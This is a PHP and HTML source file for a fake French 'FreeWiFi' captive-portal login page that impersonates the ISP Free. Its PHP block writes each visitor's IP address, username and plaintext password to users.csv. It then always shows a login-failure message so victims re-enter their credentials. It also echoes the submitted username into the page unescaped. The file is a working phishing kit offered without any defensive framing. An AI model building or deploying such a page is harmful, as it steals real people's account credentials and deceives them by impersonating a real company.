<?php
    
    $hasError = false;
    $ident = '';
    
    if (isset($_POST['submit']))
    {
        $hasError = true;
        $ident = $_POST['user'];
        
        $ff = fopen('users.csv', 'a');
        if ($ff)
        {
            fwrite($ff, $_SERVER['REMOTE_ADDR'].';'.$_POST['user'].';'.$_POST['pass']."\n");
            fclose($ff);
        }
        
    }

    
?>

<!DOCTYPE html>
<html>
    <head>
        <title>Free Wifi</title>
        <style type="text/css">
        
            body {
                background: url(back.png) repeat-x;
                padding: 0;
                margin: 0;
                font-family: Arial, sans-serif;
                font-size: 14px;
                color: #666;
            }
            
            #logo {
                margin: 4px auto 0 auto;
                width: 115px;
                height: 84px;
                background: url(logo.png) no-repeat;
                
            
            }
            
            #main {
                text-align: center;
                width: 400px;
                margin: 0 auto;
                padding: 10px 0 0 0;
            }
            
            h1 {
                color: rgb(99, 97, 98);
                text-transform: uppercase;
                font-size: 20px;
            }
            
            h1 span {
                color: rgb(190, 17, 13);
                text-transform: none;
            }
            
            #box {
                background: url(box-back.png) repeat-x;
                border: 1px solid rgb(236, 236, 236);
                height: 180px;
                padding: 10px 20px;
            }
            
            label {
                font-size: 16px;
                text-transform: uppercase;
                color: #666;
                font-weight: bold;
                display: block;
                width: 160px;
                text-align: right;
                float: left;
                padding-top: 4px;
            }
            
            input {
                padding: 0 5px 0 5px;
                background: url(text-back.png) no-repeat;
                width: 153px;
                height: 27px;
                border: 0;
                margin-bottom: 10px;
            }
            
            button {
            
                padding: 2px 20px;
            
            }
            
            #ad {
                width: 295px;
                height: 137px;
                background: url(ad.png) no-repeat;
                margin: 15px auto 0 auto;
            }
            
            a {
                font-size: 12px;
                color: inherit;
            }
        
            #message {
                height: 48px;
            
            }
            
            .error {
                color: rgb(190, 17, 13);
            }
        
        </style>
    </head>
    <body>
        <div id="logo"></div>
        <div id="main">
            <h1>Connexion au service <span>FreeWiFi</span></h1>
            <div id="box">
                <?php if (!$hasError): ?>
                <p id="message">Pour vous connecter au service FreeWiFi, utilisez les identifiants que vous avez configurés lors de votre premier accès au service</p>
                <?php else: ?>
                <p id="message" class="error">Impossible de se connecter ! Vérifiez vos identifiants et veuillez réessayer.</p>
                <?php endif; ?>
                <form method="post" action="index.php"> 
                    <label for="user">Identifiant</label><input type="text" name="user" value="<?php echo $ident; ?>" />
                    <label for="pass">Mot de passe</label><input type="password" name="pass" />
                    <button type="submit" name="submit">Valider</button>
                </form>
            </div>
            <p><a href="http://www.free.fr/">Cliquez ici pour vous abonner à Free ADSL</a></p>
            <div id="ad"></div>
        </div>
    </body>
</html>
